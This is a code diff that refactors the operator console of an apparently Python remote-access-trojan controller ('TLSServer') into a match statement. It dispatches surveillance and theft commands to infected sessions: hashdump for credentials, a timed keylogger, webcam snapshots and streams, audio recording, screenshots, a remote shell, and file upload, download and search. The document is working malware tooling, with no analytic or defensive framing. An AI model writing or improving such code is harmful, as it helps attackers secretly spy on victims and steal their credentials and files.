@@ -122,69 +122,40 @@ class TLSServer:
 
             cmd = input(prompt).strip()
 
-            if cmd == "help":
-                self._help()
+            match cmd.split():
+                case ["help"]:
+                    self._help()
 
-            elif cmd == "sessions":
-                self._sessions()
+                case ["sessions"]:
+                    self._sessions()
 
-            elif cmd.startswith("use "):
-                self._use(cmd)
+                case ["use", session_id]:
+                    self._use(cmd)
 
-            elif cmd == "ipconfig":
-                self._send_to_current(cmd.encode("utf-8"))
+                case ["upload", filename]:
+                    self._send_file(filename)
 
-            elif cmd == "help":
-                self._send_to_current(b"HELP: available commands coming soon\n")
-
-            elif cmd.startswith("upload "):
-                filename = cmd.split()[1]
-                self._send_file(filename)
-
-            elif cmd.startswith("download "):
-                self._send_to_current(cmd.encode("utf-8"))
-
-            elif cmd.startswith("shell "):
-                self._shell(cmd)
-
-            elif cmd.startswith("search "):
-                self._send_to_current(cmd.encode("utf-8"))
-
-            elif cmd == "hashdump":
-                self._send_to_current(cmd.encode("utf-8"))
-
-            elif cmd == "screenshot":
-                self._send_to_current(cmd.encode("utf-8"))
-                
-            elif cmd.startswith("keylogger "):
-                try:
-                    int(cmd.split()[1])
+                case ["download" | "search", filename]:
                     self._send_to_current(cmd.encode("utf-8"))
-                except (ValueError, IndexError):
-                    logger.debug("Usage: keylogger <duration_seconds>")
-            elif cmd == "webcam_snapshot":
-                self._send_to_current(cmd.encode("utf-8"))
 
-            elif cmd.startswith("webcam_stream "):
-                try:
-                    int(cmd.split()[1])
+                case ["shell", port] if port.isdigit():
                     self._send_to_current(cmd.encode("utf-8"))
-                except (ValueError, IndexError):
-                    logger.debug("Usage: webcam_stream <duration_seconds>")
 
-            elif cmd.startswith("record_audio "):
-                try:
-                    int(cmd.split()[1])
+                case ["keylogger" | "webcam_stream" | "record_audio", duration] if duration.isdigit():
                     self._send_to_current(cmd.encode("utf-8"))
-                except (ValueError, IndexError):
-                    logger.debug("Usage: record_audio <duration_seconds>")
 
-            elif cmd == "exit":
-                logger.debug("Exiting admin console")
-                return
+                case ["keylogger" | "webcam_stream" | "record_audio", _]:
+                    logger.debug(f"Usage: {cmd.split()[0]} <duration_seconds>")
 
-            else:
-                pass
+                case ["ipconfig" | "hashdump" | "screenshot" | "webcam_snapshot"]:
+                    self._send_to_current(cmd.encode("utf-8"))
+
+                case ["exit"]:
+                    logger.debug("Exiting admin console")
+                    return
+
+                case _:
+                    logger.debug("Invalid command or syntax")
 
     def _help(self):
         logger.debug("Commands:")
